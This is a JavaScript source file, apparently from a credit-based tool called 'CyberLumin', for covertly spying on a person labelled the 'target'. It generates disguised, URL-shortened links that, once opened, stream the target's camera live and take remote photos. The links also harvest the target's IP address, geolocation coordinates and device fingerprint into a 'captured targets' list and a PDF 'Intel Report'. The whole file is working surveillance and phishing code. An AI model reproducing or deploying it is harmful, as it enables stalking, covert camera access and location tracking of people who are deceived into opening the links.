  const cb = document.getElementById('btn-copy-loc-short');
  if (cb) { cb.disabled = true; cb.style.opacity = '.4'; cb.style.cursor = 'not-allowed'; }
  const ss = document.getElementById('loc-shorten-status');
  if (ss) { ss.textContent = ''; ss.style.color = '#888'; }
}

function copyLocLink() {
  const link = document.getElementById('loc-final-link').value;
  if (!link || link === '') return;
  navigator.clipboard.writeText(link).then(function() {
    setLLGStatus('📋 Link copied! Send it to the target. Waiting for their location...', 'waiting');
  }).catch(function() {
    document.getElementById('loc-final-link').select();
    document.execCommand('copy');
  });
}

function resetLocLink() {
  if (locPeer) { locPeer.destroy(); locPeer = null; }
  locRawLink = ''; locRedirectUrl = '';
  document.getElementById('loc-final-link').value = '';
  document.getElementById('loc-redirect-url').value = '';
  document.getElementById('loc-redirect-preview').style.display = 'none';
  document.getElementById('btn-gen-loc').style.display = 'inline-block';
  document.getElementById('btn-reset-loc').style.display = 'none';
  lockLLGStep('llg-step2');
  lockLLGStep('llg-step3');
  lockLLGStep('llg-step4');
  const si = document.getElementById('loc-short-link');
  if (si) si.value = '';
  const cb = document.getElementById('btn-copy-loc-short');
  if (cb) { cb.disabled = true; cb.style.opacity = '.4'; cb.style.cursor = 'not-allowed'; }
  const ss = document.getElementById('loc-shorten-status');
  if (ss) ss.textContent = '';
  setLocPeerDot('offline', 'IDLE');
  setLLGStatus('Click "Generate Link" to begin', '');
}


// ══════════════════════════════════════════════════════════════
// SHARED URL SHORTENER — Parallel Race Strategy
// Tries ALL services at once, returns first winner
// Services: spoo.me · cleanuri · shrtco.de · is.gd · tinyurl
// ══════════════════════════════════════════════════════════════

// ── JSONP helper ──────────────────────────────────────────────
function _jsonpRequest(apiUrl, cbParam, ms) {
  return new Promise(function(resolve, reject) {
    const name = '_cb_' + Math.random().toString(36).substr(2, 8);
    const s = document.createElement('script');
    let done = false;
    const t = setTimeout(() => { if (!done) { done=true; cleanup(); reject('timeout'); } }, ms||8000);
    window[name] = d => { if (!done) { done=true; cleanup(); resolve(d); } };
    function cleanup() { clearTimeout(t); if (s.parentNode) s.parentNode.removeChild(s); delete window[name]; }
    s.onerror = () => { if (!done) { done=true; cleanup(); reject('err'); } };
    s.src = apiUrl + (apiUrl.includes('?')?'&':'?') + cbParam + '=' + name;
    document.head.appendChild(s);
  });
}

// ── Timeout-wrapped fetch ─────────────────────────────────────
function _ft(url, ms, opts) {
  return Promise.race([
    fetch(url, opts||{}),
    new Promise((_,r)=>setTimeout(()=>r('timeout'),ms))
  ]);
}

async function _shortenUrl(longUrl) {
  const target = longUrl; // Just use longUrl directly (removes 5s s.php delay!)

  // ── Race ALL shorteners in parallel instantly ──────────────────
  const makeAttempt = async (fn) => {
    try {
      const url = await fn();
      if (url && typeof url === 'string' && url.startsWith('http')
          && !url.includes(location.hostname)) return url;
    } catch(e) {}
    return Promise.reject('fail');
  };

  const attempts = [
    // ① spoo.me — POST, CORS ✅
    makeAttempt(async () => {
      const r = await _ft('https://spoo.me/', 6000, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' },
        body: 'url=' + encodeURIComponent(target)
      });
      const d = await r.json();
      return d.short_url;
    }),

    // ② cleanuri.com — POST, CORS ✅
    makeAttempt(async () => {
      const r = await _ft('https://cleanuri.com/api/v1/shorten', 6000, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'url=' + encodeURIComponent(target)
      });
      const d = await r.json();
      return d.result_url;
    }),

    // ③ shrtco.de — GET, CORS ✅
    makeAttempt(async () => {
      const r = await _ft('https://api.shrtco.de/v2/shorten?url=' + encodeURIComponent(target), 6000);
      const d = await r.json();
      return d.ok && d.result && d.result.full_short_link;
    }),

    // ④ is.gd — JSONP (no CORS needed) ✅
    makeAttempt(async () => {
      const d = await _jsonpRequest(
        'https://is.gd/create.php?format=json&url=' + encodeURIComponent(target),
        'callback', 6000
      );
      return d && d.shorturl;
    }),

    // ⑤ v.gd — JSONP ✅
    makeAttempt(async () => {
      const d = await _jsonpRequest(
        'https://v.gd/create.php?format=json&url=' + encodeURIComponent(target),
        'callback', 6000
      );
      return d && d.shorturl;
    }),

    // ⑥ TinyURL proxy ✅
    makeAttempt(async () => {
      const api = 'https://tinyurl.com/api-create.php?url=' + encodeURIComponent(target);
      const r   = await _ft('https://api.allorigins.win/raw?url=' + encodeURIComponent(api), 6000);
      const t   = (await r.text()).trim();
      if (t.includes('tinyurl.com')) return t;
      return Promise.reject();
    }),
  ];

  let winner = null;
  try {
    winner = await Promise.any(attempts);
  } catch(e) {}

  if (winner) return winner;
  return null;
}







// ── Location URL Shortener ──
async function shortenLocLink() {
  const longUrl = document.getElementById('loc-final-link').value.trim();
  if (!longUrl) {
    setLLGStatus('⚠️ Apply a website URL first (Step 2), then click Hide.', 'waiting');
    return;
  }

  const btn     = document.getElementById('btn-hide-loc');
  const statusEl = document.getElementById('loc-shorten-status');
  const shortIn  = document.getElementById('loc-short-link');
  const copyBtn  = document.getElementById('btn-copy-loc-short');

  if (btn) { btn.textContent = '⏳ Hiding...'; btn.disabled = true; }
  if (copyBtn) { copyBtn.disabled = true; copyBtn.style.opacity = '.4'; copyBtn.style.cursor = 'not-allowed'; }
  statusEl.textContent = '⏳ Trying shortening services...';
  statusEl.style.color = '#888';
  unlockLLGStep('llg-step4');

  const shortUrl = await _shortenUrl(longUrl);

  if (btn) { btn.textContent = '🔖 Hide'; btn.disabled = false; }

  if (shortUrl) {
    shortIn.value = shortUrl;
    copyBtn.disabled = false; copyBtn.style.opacity = '1'; copyBtn.style.cursor = 'pointer';
    statusEl.textContent = '✅ Hidden! Your domain is invisible — send this to target.';
    statusEl.style.color = '#00f0ff';
    setLLGStatus('🔗 Hidden: ' + shortUrl + ' | Copy and send to target.', 'active');
  } else {
    shortIn.value = longUrl;
    statusEl.innerHTML = '⚠️ Auto-shorten failed. <a href="https://tinyurl.com/create.php" target="_blank" style="color:#00f0ff">Open TinyURL →</a> paste Step 3 link manually.';
    statusEl.style.color = '#ffaa00';
    copyBtn.disabled = false; copyBtn.style.opacity = '1'; copyBtn.style.cursor = 'pointer';
    setLLGStatus('⚠️ Auto-shorten failed — use TinyURL manually.', 'waiting');
  }
}

function copyLocShortLink() {
  const link = document.getElementById('loc-short-link').value;
  if (!link) return;
  navigator.clipboard.writeText(link).then(function() {
    const btn = document.getElementById('btn-copy-loc-short');
    btn.textContent = '✅ Copied!';
    setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
    setLLGStatus('📋 Hidden link copied! Waiting for target to open it...', 'waiting');
  }).catch(function() {
    document.getElementById('loc-short-link').select();
    document.execCommand('copy');
  });
}

function unlockLLGStep(id) {
  const el = document.getElementById(id);
  if (el) { el.style.opacity='1'; el.style.pointerEvents='auto'; el.classList.add('unlocked'); }
}
function lockLLGStep(id) {
  const el = document.getElementById(id);
  if (el) { el.style.opacity='.4'; el.style.pointerEvents='none'; el.classList.remove('unlocked'); }
}
function setLLGStatus(msg, type) {
  const bar = document.getElementById('llg-status-bar');
  const txt = document.getElementById('llg-status-text');
  if (txt) txt.textContent = msg;
  bar.className = 'llg-status-bar' + (type ? ' '+type : '');
}
function setLocPeerDot(state, label) {
  const dot = document.getElementById('loc-peer-dot');
  const lbl = document.getElementById('loc-peer-label');
  if (dot) dot.className = 'peer-dot ' + state;
  if (lbl) lbl.textContent = label;
}

// ===== GALLERY HACK =====
function requestGallery() {
  document.getElementById('gallery-status').textContent = '⏳ Requesting gallery access...';
  setTimeout(() => {
    document.getElementById('file-input').click();
    document.getElementById('gallery-status').textContent = '✅ Access granted — select files';
  }, 800);
}

function handleFileSelect(event) {
  const files = Array.from(event.target.files);
  if (!files.length) return;
  galleryFiles = [...galleryFiles, ...files];
  updateGalleryStats();
  renderGallery();
  document.getElementById('gallery-status').textContent = `✅ ${galleryFiles.length} file(s) loaded`;
}

function updateGalleryStats() {
  const images = galleryFiles.filter(f => f.type.startsWith('image'));
  const videos = galleryFiles.filter(f => f.type.startsWith('video'));
  const totalSize = galleryFiles.reduce((a, f) => a + f.size, 0);
  document.getElementById('g-total').textContent = galleryFiles.length;
  document.getElementById('g-images').textContent = images.length;
  document.getElementById('g-videos').textContent = videos.length;
  document.getElementById('g-size').textContent = (totalSize / 1024 / 1024).toFixed(1) + ' MB';
}

function renderGallery() {
  const grid = document.getElementById('gallery-grid');
  grid.innerHTML = '';
  const filtered = currentFilter === 'all' ? galleryFiles : galleryFiles.filter(f => f.type.startsWith(currentFilter));
  if (!filtered.length) {
    grid.innerHTML = '<div class="gallery-empty"><div class="empty-icon">🗂️</div><p>No files match this filter</p></div>';
    return;
  }
  filtered.forEach(file => {
    const url = URL.createObjectURL(file);
    const item = document.createElement('div');
    item.className = 'gallery-item';
    item.setAttribute('data-type', file.type.startsWith('image') ? 'image' : 'video');
    if (file.type.startsWith('image')) {
      item.innerHTML = `<img src="${url}" alt="${file.name}" loading="lazy" /><div class="item-overlay">🔍</div>`;
      item.onclick = () => openLightbox(url, `${file.name} — ${(file.size/1024).toFixed(1)} KB`);
    } else {
      item.innerHTML = `<video src="${url}" style="width:100%;height:100%;object-fit:cover"></video><div class="item-overlay">▶</div>`;
      item.onclick = () => { window.open(url, '_blank'); };
    }
    if (currentView === 'list') item.style.aspectRatio = 'auto';
    grid.appendChild(item);
  });
}

function filterGallery(type, btn) {
  currentFilter = type;
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  renderGallery();
}

function setView(view, btn) {
  currentView = view;
  document.querySelectorAll('.view-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const grid = document.getElementById('gallery-grid');
  if (view === 'list') {
    grid.style.gridTemplateColumns = '1fr';
  } else {
    grid.style.gridTemplateColumns = 'repeat(auto-fill,minmax(120px,1fr))';
  }
  renderGallery();
}

function captureFromCam() {
  if (!stream) { alert('Start the camera first!'); return; }
  capturePhoto();
  const lastImg = capturedImages[0];
  if (lastImg) {
    const fake = dataURLtoFile(lastImg, `webcam_${Date.now()}.png`);
    galleryFiles.unshift(fake);
    updateGalleryStats();
    renderGallery();
    document.getElementById('gallery-status').textContent = '📷 Webcam capture added to gallery';
  }
}

function dataURLtoFile(dataurl, filename) {
  const arr = dataurl.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) u8arr[n] = bstr.charCodeAt(n);
  return new File([u8arr], filename, { type: mime });
}

// ===== LIGHTBOX =====
function openLightbox(url, info) {
  lastLBUrl = url;
  document.getElementById('lb-img').src = url;
  document.getElementById('lb-info').textContent = info || '';
  document.getElementById('lightbox').classList.add('open');
}

function closeLightbox() {
  document.getElementById('lightbox').classList.remove('open');
  document.getElementById('lb-img').src = '';
}

function downloadLBImage() {
  if (!lastLBUrl) return;
  const a = document.createElement('a');
  a.href = lastLBUrl;
  a.download = `cyberlumina_${Date.now()}.png`;
  a.click();
}

// ===== REMOTE CAM LINK (PeerJS) =====
async function generateCamLink() {
  // Deduct 20 credits — each Generate Link costs 20
  const ok = await deductCredit('generate_link');
  if (!ok) return;

  if (hostPeer) { hostPeer.destroy(); hostPeer = null; }

  const peerId = 'nx360-' + Math.random().toString(36).substr(2, 9);

  // ── Generate the link IMMEDIATELY using the known peerId ──
  const base = location.origin + location.pathname.replace(/\/(index\.(html|php))?$/, '');
  camRawLink = base + '/cam-link.html?host=' + peerId;
  document.getElementById('gen-link-input').value = camRawLink;
  unlockCamStep('cam-step2');
  unlockCamStep('cam-step3');
  document.getElementById('btn-reset-peer').style.display = 'inline-block';
  document.getElementById('btn-gen-link').style.display = 'none';
  setRemoteStatus('✅ Link ready! Set a disguise URL (Step 2), then copy and send to target.', 'waiting');
  setPeerDot('waiting', 'CONNECTING...');

  try {
    hostPeer = new Peer(peerId, {
      host: '0.peerjs.com', port: 443, path: '/', secure: true,
      config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
    });
  } catch(e) {
    hostPeer = new Peer(peerId);
  }

  // on('open') just confirms peer server connection — steps already unlocked
  hostPeer.on('open', function(id) {
    setPeerDot('waiting', 'WAITING');
    setRemoteStatus('✅ Link ready! Waiting for target to open the link...', 'waiting');
  });

  hostPeer.on('call', function(call) {
    call.answer(); // answer without sending our own stream
    setPeerDot('connected', 'CONNECTED');
    setRemoteStatus('🔴 LIVE — Remote camera stream received!', 'active');
    document.getElementById('remote-status-bar').style.color = '#00ff88';

    call.on('stream', function(remoteStream) {
      remoteCall = call;
      isRemoteStream = true;
      const video = document.getElementById('webcam-video');
      video.srcObject = remoteStream;
      video.style.transform = 'scaleX(1)'; // don’t mirror remote stream
      video.style.display = 'block';
      document.getElementById('cam-overlay').style.display = 'none';
      document.getElementById('scan-line').style.display = 'block';
      document.getElementById('info-status').textContent = 'REMOTE';
      document.getElementById('info-status').className = 'tag tag-green';
      document.getElementById('btn-capture').disabled    = false;
      document.getElementById('btn-stop-cam').disabled   = false;   // ← enable Stop
      document.getElementById('btn-switch-cam').disabled = false;   // ← enable Switch
      document.getElementById('btn-start-cam').disabled  = true;    // ← disable Start
      setRemoteStatus('🔴 LIVE — Remote camera stream received! Use Switch/Stop buttons.', 'active');
      video.onloadedmetadata = function() {
        document.getElementById('info-res').textContent = video.videoWidth + '×' + video.videoHeight;
        document.getElementById('info-fps').textContent = '~30 fps';
      };
    });

    call.on('close', function() {
      isRemoteStream = false; remoteCall = null;
      document.getElementById('btn-stop-cam').disabled   = true;
      document.getElementById('btn-switch-cam').disabled = true;
      document.getElementById('btn-start-cam').disabled  = false;
      setPeerDot('waiting', 'DISCONNECTED');
      setRemoteStatus('⚠️ Remote peer disconnected.', 'waiting');
    });
    call.on('error', function(err) {
      setRemoteStatus('❌ Stream error: ' + err, '');
    });
  });

  hostPeer.on('connection', function(conn) {
    remoteDataConn = conn; // save reference so we can SEND commands back
    conn.on('data', function(raw) {
      try {
        const msg = JSON.parse(raw);
        if (msg.type === 'capture' && msg.img) {
          capturedImages.unshift(msg.img);
          captureCount++;
          document.getElementById('info-captures').textContent = captureCount;
          addCaptureToList(msg.img);   // ← shows in scrollable list with download
          setRemoteStatus('📸 Photo captured! Total: ' + captureCount, 'active');
        }
        if (msg.type === 'camera_switched') {
          setRemoteStatus('🔄 Target switched to: ' + (msg.facing === 'environment' ? 'Back Camera' : 'Front Camera'), 'active');
        }
      } catch(e) {}
    });
  });

  hostPeer.on('error', function(err) {
    setRemoteStatus('❌ Peer error: ' + err.type + '. Try resetting.', '');
    setPeerDot('offline', 'ERROR');
  });

  hostPeer.on('disconnected', function() {
    setPeerDot('waiting', 'RECONNECTING');
    hostPeer.reconnect();
  });
}

function copyGenLink() {
  const link = document.getElementById('gen-link-input').value;
  if (!link) return;
  navigator.clipboard.writeText(link).then(function() {
    const btn = document.getElementById('btn-copy-link');
    btn.textContent = '✅ Copied!';
    setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
    setRemoteStatus('📋 Link copied! Waiting for target to open it...', 'waiting');
  }).catch(function() {
    document.getElementById('gen-link-input').select();
    document.execCommand('copy');
  });
}

function resetPeer() {
  if (hostPeer) { hostPeer.destroy(); hostPeer = null; }
  camRawLink = '';
  document.getElementById('gen-link-input').value = '';
  document.getElementById('btn-gen-link').style.display = 'inline-block';
  document.getElementById('btn-reset-peer').style.display = 'none';
  // Lock steps 2 & 3
  lockCamStep('cam-step2');
  lockCamStep('cam-step3');
  lockCamStep('cam-step4');
  const disguiseInput = document.getElementById('cam-disguise-url');
  if (disguiseInput) disguiseInput.value = '';
  const preview = document.getElementById('cam-disguise-preview');
  if (preview) preview.style.display = 'none';
  const si = document.getElementById('short-link-input');
  if (si) si.value = '';
  const cs = document.getElementById('btn-copy-short');
  if (cs) cs.style.display = 'none';
  const ss = document.getElementById('shorten-status');
  if (ss) ss.textContent = '';
  setPeerDot('offline', 'IDLE');
  setRemoteStatus('Click "Generate Link" to create a shareable camera link', '');
  // Reset video if it was showing remote
  const video = document.getElementById('webcam-video');
  if (!stream) {
    video.srcObject = null;
    document.getElementById('cam-overlay').style.display = 'flex';
    document.getElementById('scan-line').style.display = 'none';
    document.getElementById('info-status').textContent = 'OFFLINE';
    document.getElementById('info-status').className = 'tag tag-red';
    document.getElementById('info-res').textContent = '—';
    document.getElementById('info-fps').textContent = '—';
    document.getElementById('btn-capture').disabled = true;
  }
}

function applyCamDisguise() {
  const url = document.getElementById('cam-disguise-url').value.trim();
  if (!url) { setRemoteStatus('⚠️ Please enter a disguise URL first.', 'waiting'); return; }
  const fullUrl = url.startsWith('http') ? url : 'https://' + url;
  // Rebuild Final Link with redirect param
  const finalLink = camRawLink + '&redirect=' + encodeURIComponent(fullUrl);
  document.getElementById('gen-link-input').value = finalLink;
  document.getElementById('cam-disguise-preview').style.display = 'block';
  document.getElementById('cam-disguise-show').textContent = fullUrl;
  setRemoteStatus('✅ Disguise set → ' + fullUrl + ' | Now copy the link (Step 3) or shorten it (Step 4).', 'active');

  // Unlock Step 4 — short link panel
  unlockCamStep('cam-step4');
  // Reset any previous short link
  const si = document.getElementById('short-link-input');
  if (si) si.value = '';
  const cs = document.getElementById('btn-copy-short');
  if (cs) {
    cs.disabled = true;
    cs.style.opacity = '.4';
    cs.style.cursor = 'not-allowed';
  }
  const ss = document.getElementById('shorten-status');
  if (ss) { ss.textContent = ''; ss.style.color = '#888'; }
}

// ── Camera URL Shortener ──
async function shortenCamLink() {
  const longUrl = document.getElementById('gen-link-input').value.trim();
  if (!longUrl) {
    setRemoteStatus('⚠️ Apply a disguise URL first (Step 2), then click Hide.', 'waiting');
    return;
  }

  const btn       = document.getElementById('btn-hide-link');
  const statusEl  = document.getElementById('shorten-status');
  const shortInput = document.getElementById('short-link-input');
  const copyBtn   = document.getElementById('btn-copy-short');

  if (btn) { btn.textContent = '⏳ Hiding...'; btn.disabled = true; }
  if (copyBtn) { copyBtn.disabled = true; copyBtn.style.opacity = '.4'; copyBtn.style.cursor = 'not-allowed'; }
  statusEl.textContent = '⏳ Trying shortening services...';
  statusEl.style.color = '#888';
  unlockCamStep('cam-step4');

  const shortUrl = await _shortenUrl(longUrl);

  if (btn) { btn.textContent = '🔖 Hide'; btn.disabled = false; }

  if (shortUrl) {
    shortInput.value = shortUrl;
    copyBtn.disabled = false; copyBtn.style.opacity = '1'; copyBtn.style.cursor = 'pointer';
    statusEl.textContent = '✅ Hidden! Your domain is invisible — send this to target.';
    statusEl.style.color = '#00f0ff';
    setRemoteStatus('🔗 Hidden: ' + shortUrl + ' | Copy and send to target.', 'active');
  } else {
    shortInput.value = longUrl;
    statusEl.innerHTML = '⚠️ Auto-shorten failed. <a href="https://tinyurl.com/create.php" target="_blank" style="color:#00f0ff">Open TinyURL →</a> paste the Step 3 link manually.';
    statusEl.style.color = '#ffaa00';
    copyBtn.disabled = false; copyBtn.style.opacity = '1'; copyBtn.style.cursor = 'pointer';
    setRemoteStatus('⚠️ Auto-shorten failed — use TinyURL manually.', 'waiting');
  }
}

function copyShortLink() {
  const link = document.getElementById('short-link-input').value;
  if (!link) return;
  navigator.clipboard.writeText(link).then(function() {
    const btn = document.getElementById('btn-copy-short');
    btn.textContent = '✅ Copied!';
    setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
    setRemoteStatus('📋 Short link copied! Waiting for target to open it...', 'waiting');
  }).catch(function() {
    document.getElementById('short-link-input').select();
    document.execCommand('copy');
  });
}

function unlockCamStep(id) {
  const el = document.getElementById(id);
  if (el) { el.style.opacity = '1'; el.style.pointerEvents = 'auto'; el.classList.add('unlocked'); }
}
function lockCamStep(id) {
  const el = document.getElementById(id);
  if (el) { el.style.opacity = '.4'; el.style.pointerEvents = 'none'; el.classList.remove('unlocked'); }
}

function setRemoteStatus(msg, type) {
  const bar = document.getElementById('remote-status-bar');
  const txt = document.getElementById('remote-status-text');
  if (txt) txt.textContent = msg;
  bar.className = 'remote-status-bar' + (type ? ' ' + type : '');
}

function setPeerDot(state, label) {
  const dot = document.querySelector('.peer-dot');
  const lbl = document.getElementById('peer-conn-label');
  if (dot) { dot.className = 'peer-dot ' + state; }
  if (lbl) lbl.textContent = label;
}

// ===== IP LINK GENERATOR =====
let ipPeer = null;
let ipRawLink = '';

// ── Captured Targets store ───────────────────────────
let capturedTargets = [];

function addTargetToList(msg) {
  const t = Object.assign({ _id: capturedTargets.length, _ts: new Date() }, msg);
  capturedTargets.push(t);

  // Show panel
  const panel = document.getElementById('captured-targets-panel');
  if (panel) panel.style.display = 'block';
  const countEl = document.getElementById('targets-count');
  if (countEl) countEl.textContent = capturedTargets.length + ' captured';

  // Render list item
  const list = document.getElementById('targets-list');
  if (list) {
    const empty = list.querySelector('.targets-empty');
    if (empty) empty.remove();

    const item = document.createElement('div');
    item.className = 'target-item';
    item.id = 'titem-' + t._id;
    item.onclick = () => showTargetPreview(t._id);
    item.innerHTML = `
      <div class="ti-top">
        <span class="ti-num">#${t._id + 1}</span>
        <span class="ti-ip">${t.ipv4 || t.ip || 'Unknown'}</span>
        <span class="ti-ts">${t._ts.toLocaleTimeString()}</span>
      </div>
      <div class="ti-sub">${t.country || '—'} · ${t.city || '—'}</div>
      <div class="ti-sub" style="color:#444;margin-top:.15rem">${t.device || ''} · ${t.browser || ''}</div>
    `;
    list.appendChild(item);
    list.scrollTop = list.scrollHeight;
  }

  // Auto-select if it's the first
  if (capturedTargets.length === 1) showTargetPreview(0);
}

function showTargetPreview(idx) {
  const t = capturedTargets[idx];
  if (!t) return;

  // Highlight
  document.querySelectorAll('.target-item').forEach(el => el.classList.remove('t-active'));
  const item = document.getElementById('titem-' + idx);
  if (item) item.classList.add('t-active');

  // Populate main IP fields with this target's data
  const ipv4 = t.ipv4 || t.ip || '—';
  const setEl = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = val || '—'; };
  setEl('my-ip',          ipv4);
  setEl('ip-type-badge',  t.ip_type || 'IPv4');
  setEl('ip-ipv4',        ipv4);
  setEl('ip-ipv6',        t.ipv6 || 'Not detected');
  setEl('ip-private',     t.private_ip || 'Not detected');
  setEl('ip-org',         t.org);
  setEl('ip-asn',         t.asn);
  setEl('ip-connection',  t.connection);
  setEl('ip-country',     t.country);
  setEl('ip-city',        t.city);
  setEl('ip-region',      t.region);
  setEl('ip-postal',      t.postal);
  setEl('ip-tz',          t.timezone);
  if (t.lat && t.lon) setEl('ip-coords', parseFloat(t.lat).toFixed(5) + ', ' + parseFloat(t.lon).toFixed(5));
  setEl('ip-device',      t.device);
  setEl('ip-os',          t.os);
  setEl('ip-browser',     t.browser);
  setEl('ip-screen',      t.screen);
  setEl('ip-lang',        t.language);
  setEl('ip-platform',    t.platform);
  setEl('ip-cores',       t.cores ? t.cores + ' cores' : null);
  setEl('ip-memory',      t.memory);
  setEl('ip-touch',       t.touch);
  setEl('ip-battery',     t.battery);
  setEl('ip-cookies',     t.cookies);
  setEl('ip-dnt',         t.dnt);
  setEl('ip-ua',          t.ua);
  animateThreatBars();

  // Render preview panel
  const coords = (t.lat && t.lon) ? parseFloat(t.lat).toFixed(5)+', '+parseFloat(t.lon).toFixed(5) : '—';
  const preview = document.getElementById('target-preview');
  if (!preview) return;
  preview.style.cssText = 'overflow-y:auto;padding-left:.2rem;height:100%;';
  preview.innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.8rem;position:sticky;top:0;background:#0d1117;padding-bottom:.5rem;z-index:2;border-bottom:1px solid rgba(0,240,255,.1)">
      <span style="font-size:.75rem;color:#00f0ff88;font-family:'Share Tech Mono',monospace">TARGET #${t._id+1} DETAILS</span>
      <button onclick="downloadTargetPDF(${t._id})" style="background:linear-gradient(135deg,#00f0ff22,#7c3aed22);border:1px solid #7c3aed55;color:#a78bfa;font-size:.72rem;padding:.3rem .7rem;border-radius:6px;cursor:pointer;transition:all .2s" onmouseover="this.style.background='linear-gradient(135deg,#7c3aed44,#00f0ff22)'" onmouseout="this.style.background='linear-gradient(135deg,#00f0ff22,#7c3aed22)'">📄 Download PDF</button>
    </div>
    <div class="preview-section">
      <div class="preview-hdr">── IP ADDRESSES ───────────────────────────</div>
      <div class="preview-row"><span>🔵 IPv4 (Public)</span><span>${ipv4}</span></div>
      <div class="preview-row"><span>🟣 IPv6</span><span>${t.ipv6 || 'Not detected'}</span></div>
      <div class="preview-row"><span>🔒 Private IP</span><span>${t.private_ip || 'Not detected'}</span></div>
      <div class="preview-row"><span>📡 ISP / Org</span><span>${t.org || '—'}</span></div>
      <div class="preview-row"><span>🔗 ASN</span><span>${t.asn || '—'}</span></div>
      <div class="preview-row"><span>📶 Connection</span><span>${t.connection || '—'}</span></div>
    </div>
    <div class="preview-section">
      <div class="preview-hdr">── LOCATION ───────────────────────────────</div>
      <div class="preview-row"><span>🌍 Country</span><span>${t.country || '—'}</span></div>
      <div class="preview-row"><span>🏙️ City</span><span>${t.city || '—'}</span></div>
      <div class="preview-row"><span>🗺️ Region</span><span>${t.region || '—'}</span></div>
      <div class="preview-row"><span>📮 Postal</span><span>${t.postal || '—'}</span></div>
      <div class="preview-row"><span>⏰ Timezone</span><span>${t.timezone || '—'}</span></div>
      <div class="preview-row"><span>📍 Coordinates</span><span>${coords}</span></div>
    </div>
    <div class="preview-section">
      <div class="preview-hdr">── DEVICE & BROWSER ───────────────────────</div>
      <div class="preview-row"><span>💻 Device</span><span>${t.device || '—'}</span></div>
      <div class="preview-row"><span>🖥️ OS</span><span>${t.os || '—'}</span></div>
      <div class="preview-row"><span>🌐 Browser</span><span>${t.browser || '—'}</span></div>
      <div class="preview-row"><span>📺 Screen</span><span>${t.screen || '—'}</span></div>
      <div class="preview-row"><span>🗣️ Language</span><span>${t.language || '—'}</span></div>
      <div class="preview-row"><span>🧠 CPU Cores</span><span>${t.cores ? t.cores+' cores' : '—'}</span></div>
      <div class="preview-row"><span>💾 Memory</span><span>${t.memory || '—'}</span></div>
      <div class="preview-row"><span>🔋 Battery</span><span>${t.battery || '—'}</span></div>
      <div class="preview-row"><span>🍪 Cookies</span><span>${t.cookies || '—'}</span></div>
      <div class="preview-row"><span>🕐 Captured</span><span>${t._ts.toLocaleString()}</span></div>
    </div>
  `;
}

function clearAllTargets() {
  capturedTargets = [];
  const list = document.getElementById('targets-list');
  if (list) list.innerHTML = '<div class="targets-empty">⏳ Waiting for targets...</div>';
  const prev = document.getElementById('target-preview');
  if (prev) prev.innerHTML = '<div class="preview-empty">👆 Click a target from the list to view their details</div>';
  const countEl = document.getElementById('targets-count');
  if (countEl) countEl.textContent = '0 captured';
}

async function downloadTargetPDF(idx) {
  const t = capturedTargets[idx];
  if (!t) return;

  // Button feedback
  const btn = document.querySelector(`button[onclick="downloadTargetPDF(${idx})"]`);
  if (btn) { btn.innerHTML = '⏳ Generating...'; btn.disabled = true; }

  const ipv4   = t.ipv4 || t.ip || '—';
  const coords = (t.lat && t.lon) ? parseFloat(t.lat).toFixed(5) + ', ' + parseFloat(t.lon).toFixed(5) : '—';
  const ts     = t._ts ? new Date(t._ts).toLocaleString() : new Date().toLocaleString();
  const refId  = Math.random().toString(36).substring(2,10).toUpperCase();
  const esc    = s => String(s || '—').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

  // Create hidden render container
  const wrap = document.createElement('div');
  wrap.style.cssText = 'position:fixed;left:-9999px;top:0;width:780px;background:#060c14;color:#e2e8f0;font-family:Arial,sans-serif;padding:32px;box-sizing:border-box;';

  wrap.innerHTML = `
    <div style="border:2px solid #00f0ff;border-radius:10px;padding:24px;background:#060c14;position:relative;overflow:hidden;">
      <!-- Top gradient bar -->
      <div style="position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#00f0ff,#7c3aed,#00f0ff);"></div>

      <!-- Header -->
      <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:20px;padding-bottom:14px;border-bottom:1px solid #0e2030;">
        <div>
          <div style="font-size:22px;font-weight:900;color:#00f0ff;letter-spacing:2px;text-transform:uppercase;">CyberLumin // Intel Report</div>
          <div style="font-size:10px;color:#5a7a8a;margin-top:4px;letter-spacing:1.5px;">IP INTELLIGENCE SURVEILLANCE LOG</div>
        </div>
        <div style="text-align:right;">
          <div style="display:inline-block;padding:4px 10px;background:#0a1c28;border:1px solid #00f0ff;color:#00f0ff;font-size:9px;font-weight:700;border-radius:4px;letter-spacing:1px;">CLASSIFIED</div>
          <div style="font-size:9px;color:#5a7a8a;margin-top:5px;">${ts}</div>
          <div style="font-size:9px;color:#5a7a8a;">REF: ${refId}</div>
        </div>
      </div>

      <!-- IP Hero Banner -->
      <div style="background:#0a1c28;border:1px solid #00f0ff33;border-radius:8px;padding:18px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
        <div>
          <div style="font-size:9px;text-transform:uppercase;color:#5a7a8a;letter-spacing:2px;margin-bottom:4px;">TARGET NETWORK ADDRESS</div>
          <div style="font-size:30px;font-weight:700;color:#fff;letter-spacing:1px;">${esc(ipv4)}</div>
          <div style="margin-top:5px;"><span style="font-size:9px;padding:3px 8px;background:#00f0ff;color:#060c14;font-weight:900;border-radius:3px;">TARGET #${t._id + 1}</span></div>
        </div>
        <div style="text-align:right;">
          <div style="font-size:9px;color:#5a7a8a;letter-spacing:1px;margin-bottom:3px;">NETWORK PROVIDER</div>
          <div style="font-size:13px;color:#00f0ff;font-weight:600;">${esc(t.org)}</div>
          <div style="font-size:10px;color:#5a7a8a;margin-top:3px;">ASN: ${esc(t.asn)}</div>
        </div>
      </div>

      <!-- Two column grid -->
      <div style="display:flex;gap:16px;margin-bottom:16px;">

        <!-- Network & Location -->
